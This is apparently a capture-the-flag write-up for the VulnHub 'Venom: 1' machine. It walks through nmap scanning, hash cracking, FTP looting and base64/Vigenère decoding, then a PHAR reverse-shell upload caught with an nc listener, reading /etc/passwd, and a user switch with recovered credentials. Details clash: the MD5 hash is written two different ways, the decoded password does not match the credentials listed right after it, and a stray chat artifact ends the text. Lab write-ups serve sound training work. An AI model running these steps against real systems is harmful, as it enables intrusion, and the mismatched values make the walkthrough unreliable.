# Venom: 1

- **Machine:** Venom: 1
- **Download:** https://www.vulnhub.com/entry/venom-1,701/

![](823-1.png)

---

# Machine Setup

1. Extract the downloaded archive.

```bash
unzip venom.zip
```

![](823-2.png)

2. Import the **OVA** file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

Identify the target machine on the local network.

```bash
nmap -sn 192.168.2.0/24
```

![](823-3.png)

---

## Full Nmap Scan

Perform a complete scan to enumerate open ports, running services, operating system details, and default NSE script results.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.164
```

![](823-4.png)

---

## Optional Enumeration

Scan every TCP port.

```bash
nmap -v -p- 192.168.2.164
```

Run a standard service detection scan.

```bash
nmap -sC -sV -A 192.168.2.164
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.164
```

---

# Web Enumeration

Browse the web application.

```text
http://192.168.2.164/
```

View the page source.

```text
view-source:http://192.168.2.164/
```

![](823-5.png)

An MD5 hash is discovered.

---

## Identify the Hash

```bash
hash-identifier 5f2a66f947fa5690c26506f660de5c23
```

![](823-6.png)

---

## Crack the Hash

Use Hashcat to recover the plaintext value.

```bash
hashcat -m 0 5f2a66f947fa5690c26506f66bde5c23 /opt/rockyou.txt --force
```

![](823-7.png)

---

# FTP Enumeration

Connect to the FTP service.

```bash
ftp 192.168.2.164
```

List the available files.

```bash
ls
```

Navigate into the files directory.

```bash
cd files
```

List its contents.

```bash
ls
```

Download the hint file.

```bash
get hint.txt
```

![](823-8.png)

---

## Inspect the Hint File

Display its contents.

```bash
cat hint.txt
```

![](823-9.png)

Several Base64-encoded strings are present.

Decode them one by one.

```bash
echo "WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=" | base64 -d
```

```bash
echo "YzNSaGJtUmhjbVFnZG1sblpXNWxjbVVnWTJsd2FHVnk=" | base64 -d
```

```bash
echo "c3RhbmRhcmQgdmlnZW5lcmUgY2lwaGVy" | base64 -d
```

```bash
echo "aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=" | base64 -d
```

![](823-10.png)

The decoded output references a **Vigenère cipher** and provides an online decoder.

```text
https://cryptii.com/pipes/vigenere-cipher
```

![](823-11.png)

After decoding the ciphertext, the password is recovered.

```text
L7f9l8@J#p%Ue+Q1234
```

Recovered credentials:

```text
Username : dora
Password : E7r9t8@Q#h%Hy+M1234
```

![](823-12.png)

---

# Configure Local Hostname

Add the hostname mapping.

```bash
nano /etc/hosts
```

```text
192.168.2.164 venom.box
```

![](823-13.png)

Browse the application.

```text
http://venom.box/
```

Navigate to the administration dashboard.

Discovered endpoint:

```text
http://venom.box/panel/
```

![](823-14.png)

---

# Reverse Shell

Create a PHAR payload.

```bash
nano reverse_shell.phar
```

Insert a PHP reverse shell payload.

---

## Upload the Payload

Navigate through the application.

```text
Content → Uploads → Upload Files
```

Upload the `reverse_shell.phar` file.

![](823-15.png)

---

## Start a Listener

```bash
nc -nlvp 443
```

---

## Execute the Payload

Browse to the uploaded file.

```text
http://venom.box/uploads/reverse_shell.phar
```

A reverse shell is established.

![](823-16.png)

---

# Local Enumeration

Inspect the system users.

```bash
cat /etc/passwd
```

![](823-17.png)

Navigate to the backup directory.

```bash
cd /var/backup.bak
```

Display hidden files.

```bash
ls -lha
```

![](823-18.png)

Read the backup file.

```bash
cat .backup.txt
```

![](823-19.png)

---

# Shell Stabilization

Upgrade the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# User Access

Switch to the recovered user.

```bash
su hostinger
```

![](823-20.png)

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | Information disclosure in page source | Credential leakage |
| 2 | Weak cryptographic protection | Recoverable credentials |
| 3 | Sensitive files accessible through FTP | Information disclosure |
| 4 | File upload vulnerability | Remote Code Execution |
| 5 | Exposed backup files | Credential disclosure |
| 6 | Credential reuse | User account compromise |

---

# Key Learning

- Always inspect HTML source code during web enumeration.
- FTP services frequently expose backup files and internal documentation.
- Base64 encoding is not encryption and should never be used to protect sensitive data.
- Multi-stage encoding (Base64 + Vigenère) can often be reversed through careful analysis.
- File upload functionality should strictly validate file types and execution permissions.
- Post-exploitation enumeration often reveals additional credentials and privilege escalation opportunities.

---

# Summary

The assessment began with network reconnaissance, followed by web enumeration that revealed an MD5 hash embedded in the application's source code. FTP enumeration uncovered additional hint files containing Base64-encoded strings that ultimately led to a Vigenère cipher and the recovery of valid application credentials. After configuring the local hostname, access to the administration panel was obtained, where an unrestricted file upload vulnerability allowed a malicious PHAR file to be uploaded and executed, resulting in Remote Code Execution. Following initial compromise, local enumeration exposed backup files containing additional credentials, allowing a successful switch to the **hostinger** user and providing a solid foundation for further privilege escalation. :contentReference[oaicite:0]{index=0}